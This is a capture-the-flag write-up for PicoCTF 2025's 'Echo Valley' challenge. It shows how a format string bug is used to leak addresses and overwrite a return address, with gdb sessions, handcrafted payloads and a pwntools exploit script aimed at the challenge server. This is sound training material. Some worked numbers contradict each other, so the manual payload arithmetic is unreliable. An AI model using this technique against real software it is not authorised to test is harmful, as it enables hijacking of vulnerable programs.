# Echo Valley
This was a challenge listed in PicoCTF 2025.  It's listed as Medium and categorized as a Binary Exploitation challenge.

## Description
The Description reads:
> The echo valley is a simple function that echoes back whatever you say to it.  
> But how do you make it respond with something more interesting, like a flag?

## Hints
There is a single hint that reads:
> Ever heard of a format string attack?

# Solving
## My Thoughts
This was the first of the challenges that I ended up solving after the CTF ended, I got a little sick of binary exploitation challenges during the actual event and instead banged my head against the CHACHA one for hours.  Please note that instead of going the easy route in this challenge, I instead spend a lot of time understanding how the quick route works.  You can simply use pwntools' fmtstr_payload function, but if you want to see my rambling explanations on how to calculate it yourself, read through the whole thing.

## Source Code
Before even jumping into the program, let's take a quick look at the source code, I've added comments to improve readability:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Prints the flag...duh.
void print_flag() {
    // Initiates a string variable named buf that will hold up to 32 bytes of data.
    char buf[32];

    // fopen will open a file pointer to the /home/valley/flag.txt file in read only mode.
    FILE *file = fopen("/home/valley/flag.txt", "r");

    // Makes sure the file actually exists
    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    // Uses the fgets function to read in data from the file (up to the size of buf), storing the data in buf.
    fgets(buf, sizeof(buf), file);
    // Prints the data in buf.
    printf("Congrats! Here is your flag: %s", buf);
    // Closes the file.
    fclose(file);
    // Exits out of the program.
    exit(EXIT_SUCCESS);
}

// This function is responsible for most of what actually happens and where our vulnerable code sits.
void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    // Initiates a string variable named buf that can hold up to 100 bytes.
    char buf[100];

    // Essentially will loop forever since 1 evaluates to True.
    while(1)
    {
        // Flushes the output buffer of the stdout stream, 
        // it makes sure any buffered data is written to the 
        // file/device associated with the stream.
        fflush(stdout);
        // Reads in up to 100 bytes of user input and stores it in buf.
        // Also checks to make sure the user actually entered something,
        // If they didn't, the program exits.
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        // Checks if the user entered the string 'exit' exactly.
        // If they did, it prints the below string and ends the while loop.
        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        // Prints out the user's input and flushes stdout like it did above.
        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    // Once the while loop is exited, the stdout stream is flushed.
    fflush(stdout);
}

// The main function, where everything else starts.
int main()
{
    // Calls the echo_valley function with no variables.
    echo_valley();
    // Returns 0 if the prgoram runs through without issues.
    return 0;
}

```

Now, there are really only a few functions in the script, let's look at each below:

- fflush:  This function is only really dangerous if it's used with an input stream.  It's only ever used with stdout in this program which means it's not dangerous or exploitable (at least not directly).
- fgets:  This function on it's own is not dangerous, but it combined with unsanitized input and the below function does make it problematic!
- printf:  This function allows us to send in format strings, allowing us to do all sorts of nasty things.

Let's see what we can do with that, but first lets check out the executable.

## Executable
Let's run file and checksec on it to see what we're working with:

``` bash
└─$ file valley
valley: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=389c2641f0d3caae81af5d21d9bb5bcf2de217f0, for GNU/Linux 3.2.0, with debug_info, not stripped

└─$ checksec valley
[*] '/home/noah/echovalley/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

So, we're working with a 64-bit LSB (least significant bit), PIE executable.  Running strings doesn't give us anything crazy, let's try running it now and see what we can do.

## Running It
Well we can definitely see that there is a string format vulnerability:

![String Format Vulnerability](https://github.com/user-attachments/assets/c60b3759-65ec-434d-8dee-479470975f9b)

Let's run it through GDB and get the memory addresses of the various functions:

``` bash
─
pwndbg> print main
$1 = {int ()} 0x555555555401 <main>
pwndbg> print print_flag
$2 = {void ()} 0x555555555269 <print_flag>
pwndbg> print echo_valley
$3 = {void ()} 0x555555555307 <echo_valley>
```

We can also see that the values above are based on the starting address below:

![Starting Address](https://github.com/user-attachments/assets/f25f776c-8430-4a51-975d-6799904a4622)

I wanted to set up a script I could easily reuse to parse through memory locations given a print string vulnerable application, so I wrote this one out.  You can find this [here](https://github.com/noah344/CTF_Stuff/blob/main/Scripts/Binary/grab_memory_addresses.py):

``` python
#! /usr/bin/python3
'''
This script should be ran after gathering memory address locations for the various functions in the binary (assuming you have the source code/have function names).
You can provide it both the start memory location and function memory locations.  You should adjust the various aspects to suit your own binary.
This script will only work if the binary is vulnerable to print format vulnerabilities.
'''

from pwn import *
import itertools

# Loops until the user enters a valid integer that corresponds with the number of memory addresses the script should parse through.
while(True):
  try:
    count = int(input("Please enter the number of memory addresses we should try: "))
    break
  except Exception as e:
    print("ERROR: Please enter a valid integer, your response ({count}) was not valid.")

# Loops until a break occurs
while(True):
  # Errors out if the user enters invalid hex (address location) data.
  try:
    print("\nEnter the expected start address of the program: ")
    start_addr = input("Address: ")
    # Attempts to conver the string to an integer and then to hex, if it fails the user did something wrong.
    hex(int(start_addr, 16))
    break
  except Exception as e:
    print(f"\nERROR: Invalid hex data entered ({start_addr}), please try again.")

print("\nIf you have expected addresses of other functions, enter them below.")
print("Please use this format: func_name:address.")
print("When done, or if you do not wish to enter additional addresses, simply press enter.")

# Initializes a dictionary to hold the user's entered info.
addrs = {}
# Initializes a string so the while loop will run.
res = " "
while(res):
  # Errors out if the user enters invalid hex data.
  try:
    res = input("Function Address (func_name:address): ")
    # Attempts to add the user's entered data into the dictionary with the func_name as the key and the address as the value.
    hex(int(res.split(":")[1], 16))
    addrs[res.split(":")[1]] = res.split(":")[0]
  except Exception as e:
    if res:
      print(f"\nERROR: Invalid hex data entered({res}), please try again.")

# Disables ASLR to mimic gdb
context.aslr = False
# Sets up the ELF so we can go through it.
elf = context.binary = ELF('./valley')
# Runs the process in the background
p = process()
# Gets the first line since we don't really care about it.
p.recvline()

# Initiates some lists for holding any matches we find.
matches = []
exact_matches = []

# Loops through the values 1-count, trying out those stack locations.
for i in range(1,count):
  # Sends the line that we'll be using to get the leak, .encode is necessary to quiet an annoying pwntools warning.
  p.sendline(f'%{i}$p'.encode())

  # Grabs the leak from the web server.
  elf_leak = p.recvline().decode().split(": ")[1].strip()

  # Checks if the leak is an exact match and adds it to exact_matches.
  if elf_leak in addrs.keys():
    exact_matches.append([elf_leak, i])
  # Checks if the leak is a close match and adds it to the close matches.
  elif start_addr[:-4] in elf_leak:
    matches.append([elf_leak, i])

# Only goes in here if there are any matches in exact_matches
if exact_matches:
  print("\nEXACT MATCHES")
  print("-------------")
  for i in exact_matches:
    print(f"Exact Match for Function {addrs[i[0]]} at offset {i[1]}: {i[0]}")

# Only goes in here if there are any matches in matches
if matches:
  print("\nCLOSE MATCHES")
  print("-------------")
  for i in matches:
    print(f"Close Match at offset {i[1]}: {i[0]}")

# If there are no matches at all
if not exact_matches and not matches:
  print("No matches found :(")
```

Essentially this script will parse through the binary to the specified offset and print out any memory locations that are exact or close matches to our known functions, check out the output below:

``` bash
└─$ ./grab_memory_addresses.py LOG_LEVEL=critical
Please enter the number of memory addresses we should try: 100

Enter the expected start address of the program:
Address: 0x555555554000

If you have expected addresses of other functions, enter them below.
Please use this format: func_name:address.
When done, or if you do not wish to enter additional addresses, simply press enter.
Function Address (func_name:address): main:0x555555555401
Function Address (func_name:address): echo_valley:0x555555555307
Function Address (func_name:address): print_flag:0x555555555269
Function Address (func_name:address):

EXACT MATCHES
-------------
Exact Match for Function main at offset 25: 0x555555555401
Exact Match for Function main at offset 44: 0x555555555401

CLOSE MATCHES
-------------
Close Match at offset 4: 0x5555555596b5
Close Match at offset 21: 0x555555555413
Close Match at offset 33: 0x555555557d78
Close Match at offset 45: 0x555555557d78
Close Match at offset 49: 0x555555555180
Close Match at offset 53: 0x5555555551a5
```

Awesome, so we have a couple memory offset locations for main! We can use that to exploit the binary locally and get our flag!  Let's get a few more numbers first:

- Distance between start of program and main:  0x555555555401 - 0x555555554000 = 0x1401
- Distance between start of program and print_flag: 0x555555555269 - 0x555555554000 = 0x1269

So, if we subtract 0x1401 from the found memory address of main, and then add 0x1269 to that number, we'll get the memory address of print_flag, let's test it out with the actual binary:

``` bash
└─$ ./valley
Welcome to the Echo Valley, Try Shouting:
%25$p
You heard in the distance: 0x562e16fb9401
```

Ok, so the memory location of main is:  0x562e16fb9401  
So the start location will be:  0x562e16fb9401 - 0x1401 = 0x562e16fb8000  
And the memory location of print_flag will be:  0x562e16fb8000 + 0x1269 = 0x562E16FB9269

## Arbitrary Write
So, we've gotten all the info we need in terms of data that we'll need to write.  But how do we actually do that?  I didn't know myself, so I spent a few days trying to find the info I needed and finally found some decent sources.  I'm going to go into some detail on how C code works here so you can understand exactly whats going on.  Take all of this with a grain of salt as my understanding of C is flaky at best.

When a function is called in C, the program needs to remember where it left off so that it can continue running once it finishes going through the called function.  This is a special address referred to as the 'return address'.  Like I said, when a function is called, the return address is placed on the stack.  Once the program finishes running through the called function, it will return back to this 'return address' so that it can continue running through the program.  Let's look at exactly where we'll be seeing a return address in our program:

``` c
int main()
{
    // Calls the echo_valley function with no variables.
    echo_valley();
    // Returns 0 if the prgoram runs through without issues.
    return 0;
}
```

In main, as soon as the 'echo_valley()' line is ran, a return address is added to the stack, to be precise a pointer to the return address as well as the return address itself.  Let's go ahead and visualize that though.  I'm going to open the program in gdb, create a breakpoint at echo_valley, and then print out some info using a command that will provide info on the frame.  A frame, or stack frame, is an allocated memory space that holds information relevant to a called function.  This will include things such as local variables, as well as the return address!  So let's check out that return address:

``` bash
└─$ gdb valley
pwndbg> br echo_valley
Breakpoint 1 at 0x1313: file /home/valley/valley.c, line 20.
pwndbg> run
Starting program: /home/noah/echovalley/valley
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, echo_valley () at /home/valley/valley.c:20
pwndbg> info frame
Stack level 0, frame at 0x7fffffffe080:
 rip = 0x555555555313 in echo_valley
    (/home/valley/valley.c:20);
    saved rip = 0x555555555413
 called by frame at 0x7fffffffe090
 source language c.
 Arglist at 0x7fffffffe070, args:
 Locals at 0x7fffffffe070, Previous frame's sp is 0x7fffffffe080
 Saved registers:
  rbp at 0x7fffffffe070, rip at 0x7fffffffe078
```

The value we are looking for specifically is rip, which is 0x555555555313.  Now, if we can somehow find where this specific value is at in memory and overwite it, we can 'encourage' the program to instead return to the print_flag function!  So how do we do that?  Well it shows you just above!  The rip is stored at 0x7fffffffe078 which is conspicuously close to another value we pulled off of the stack earlier:

``` bash
Welcome to the Echo Valley, Try Shouting:
%20$p
You heard in the distance: 0x7fffffffe070
```

You'll also notice that the same value can be found in the frame info above, 0x7fffffffe070 is the memory location of the frame itself.

So the value located 20th in the stack is only 8 away from the pointer to our return value.  The location we need to try to overwrite, at least in the non-aslr binary, would be 0x7fffffffe078.  Let's make sure we can do that and get the fake flag before we try to do it on the server.

## Arbitrary Write Continued
There is a very useful pwntools function that will setup the string format for you, I want to learn how to do it myself, so we're going to do it manually!  Arbitrary writes given a string format vulnerability are special.  There is a particular string format character, %n, which allows writing to the stack the value of the total number of bytes written SO FAR.  For example:

```
printf("AAAA%n", &count)
```

In this case, count would equal 4, because it had printed 4 characters already.  If the printf function is not expecting the %n and no arguments are present, printf will instead go to the next available space on the stack, interpret it as a pointer, and write to it.  If we provide a memory location in the same line directly after the %n, printf will instead interpret that as a pointer and allocate the value of %n to that location.  This is the key to some major bugs and vulnerabilities in C and allows arbitrary execution of code.  This is going to get really really complicated so bear with me! I have yet to see a single source that actually gets into how to do this by hand, so lets get to it!

Let's start up the program and dump the stack spaces 20 (the frame pointer we discovered above), and 25 (the main location we also discovered above):

``` bash
└─$ ./valley
Welcome to the Echo Valley, Try Shouting:
%20$p|%25$p
You heard in the distance: 0x7fffdb29e3e0|0x55aecaadc401
```

Ok, so the memory addresses we know right now are:

- Frame:  0x7fffdb29e3e0
- Address of Main:  0x55aecaadc401

Let's do some quick calculations to get the rest of the addresses we need based on the numbers we gathered much higher up:

- Return Address Location:  0x7fffdb29e3e0 - 0x8 = 0x7fffdb29e3d8
- Memory Start Location:  0x55aecaadc401 - 0x1401 = 0x55aecaadb000 (looks accurate since PIE memory addresses end with 000)
- print_flag Location:  0x55aecaadb000 + 0x1269 = 0x55aecaadc269

Now we have everything we need!  We need to update the value stored at 0x7fffdb29e3d8 with the print_flag memory location 0x55aecaadc269.  Now for the tricky part.

Some things to understand before we go further because I won't explain them here:  endianness, difference between n, lln, and hn

Let's start by splitting up our new address into chunks and converting the chunks to decimal:

- 55ae: 21934
- caad: 51885
- c269: 49769

Ok cool, let's now find some empty spaces on the stack:

![Empty](https://github.com/user-attachments/assets/6a190d9c-1575-4e47-a097-0d62204fda60)

Looks like 11, 12, and 13 are empty so we can use those.  Now because of the endianness we need to toss things on the stack in reverse order!  So let's start formulating the first half of our payload:

### Step 1: Characters
```
- %49769c
c269
- %2116c
%n counts the TOTAL amount of characters printed, we've already printed
51885 - 49769 = 2116
- %35585c
Obviously 49769 + 2116 is greater than 21934, what we can do is add a 1 in front of 55ae to make it 155ae.
155ae in decimal is 87470 - 2116 - 49769 = 35585
```

Nice, so we have the character spacing ready, now we need to place it on the stack!

### Step 2: Stack Placement
```
- %49769c%11$lln
This first one will go on the first empty stack space, it will be in long long format meaning it will take up the full 8 bytes and look like this:  0x000000000000c269.  You'll see why we do this later!

- %2116c%12$hn
This heads over to stack 12 and tosses the value 0xcaad in there.

- %35585c%13$hn
Same as above but puts 55ae in there.
```

So all combined, the first half of our payload looks like this:

```
%49769c%11$lln%2116c%12$hn%35585c%13$hn
```

Neat! Now the final part is the padding, we need to make sure that the first half of this payload fits cleanly within the stack.  This means it needs to be equally divisible by 8.  In our case, the above payload is 39 characters long.  We can fix this up by simply adding one extra meaningless character to make our finalized first half this:

```
%57961c%11$lln%7024c%12$hn%22625c%13$hna
```

Awesome!  NEXT

### Step 3:  Addresses
Remember your endianness for this part!  We need to now tell the printf function where we want to write those values we just passed it.  We do this by passing in a number of address spaces equal to the number of chunks we made.  We start with the start location of the return address which we uncovered above (0x7fffdb29e3d8), the formatting needs to look like this for this challenge:

```
0x7fffdb29e3d8 - \xd8\xe3\x29\xdb\xff\x7f\x00\x00
We add in the 0 bytes there to get the full 8 bytes.  Because of what we did earlier with the long long,
the entire memory space has been overwritten! This means there won't be any weird bits hanging around.
Our return address will look like this now:  0x000000000000c269

Now, we've added two bytes, so let's increment our pointer by 2:
0x7fffdb29e3da - \xda\xe3\x29\xdb\xff\x7f\x00\x00
Our return address will now look like this:  0x00000000caade269

Incremement by 2 again:
0x7fffdb29e3dc - \xdc\xe3\x29\xdb\xff\x7f\x00\x00
Our final return address will look like this:  0x000055aefdd9e269
```

Ok let's finalize our payload and send it in!

```
%57961c%11$lln%7024c%12$hn%22625c%13$hna\xd8\xe3\x29\xdb\xff\x7f\x00\x00\xda\xe3\x29\xdb\xff\x7f\x00\x00\xdc\xe3\x29\xdb\xff\x7f\x00\x00
```

BUT WAIT

Before you send it in, know that it won't work!  Yup, all that work and it won't work if we just try to toss that string into the executable.  I found this out after several days of troubleshooting.  Copy/pasting will I guess insert a bunch of hidden characters into your string, screwing up your payload.  We need to send it in as binary data...but how do we do that?

Well, if we knew our payload beforehand we could do something like this:

``` bash
echo -en '%57961c%11$lln%7024c%12$hn%22625c%13$hna\xd8\xe3\x29\xdb\xff\x7f\x00\x00\xda\xe3\x29\xdb\xff\x7f\x00\x00\xdc\xe3\x29\xdb\xff\x7f\x00\x00' | ./valley
```

This command will output our string as binary directly to valley and get us our flag!  Only problem is, we don't know our payload beforehand.  I experimented with loading in the executable in python and opening up pipes to transmit the data, no luck.

The ONLY way I found to make this work was to make a python script that would wait to read in a binary file once it was created.  So I started up a python script that would start up the valley executable which would allow me to get the values I needed from the program.  I then would calculate the payload, and echo it to the binary file like so:

``` bash
echo -en '%57961c%11$lln%7024c%12$hn%22625c%13$hna\xd8\xe3\x29\xdb\xff\x7f\x00\x00\xda\xe3\x29\xdb\xff\x7f\x00\x00\xdc\xe3\x29\xdb\xff\x7f\x00\x00' > ./payload.bin
```

The script would notice the file getting created, read the data in as binary data, and transmit it to the program as shown below:

``` bash
The Valley Disappears
Congrats! Here is your flag: YOU GOT ME
[*] Got EOF while reading in interactive
$
```

Would I recommend anybody EVER do this manually? No.  This took literal days to finally get working and I'll never do this again.  I'm putting this out there as reference on HOW to do it.  The script I ultimately used to get it done is here, note that it also automatically calculates the flag so...there you go.

Save yourself some time and use pwntools' tool.  It works every time, my method works some of the time because of a few other weird things (0 bytes, etc.).

ALSO note that when you do run this against the server, the 25th and 44th values are no longer exact matches for main.  You have to use the value at 21 which is ALWAYS 18 higher than main which is what's shown below.  The script that will auto get you the flag can be found in the main folder as well.

``` python
#! /usr/bin/python3

from pwn import *
import sys

context.log_level = 'debug'

port = int(input("Please enter the port: "))

elf = context.binary = ELF("./valley", checksec=False)
p = remote("shape-facility.picoctf.net", port)

p.sendline(b"%20$p|%21$p")
p.recvuntil(b"the distance: ")
leak = p.recvline().strip()

main_leak = int(leak.split(b'|')[1], 16) - 18
ret = int(leak.split(b'|')[0], 16) - 8

elf.address = main_leak - elf.sym.main

print(f"Main Leak: {hex(main_leak)}")
print(f"Return Value Memory Address: {hex(ret)}")
print(f"Print Flag: {hex(elf.sym.print_flag)}")

print(fmtstr_payload(6, {ret: elf.sym.print_flag}, write_size="short"))

while True:
  try:
    with open("./payload.bin", "rb") as file:
      payload = file.read()
      break
  except Exception as e:
    pass

print(f"Payload: {payload}")
p.sendline(payload)
p.sendline(b"exit")

p.interactive()
```

Can you tell I'm tired?
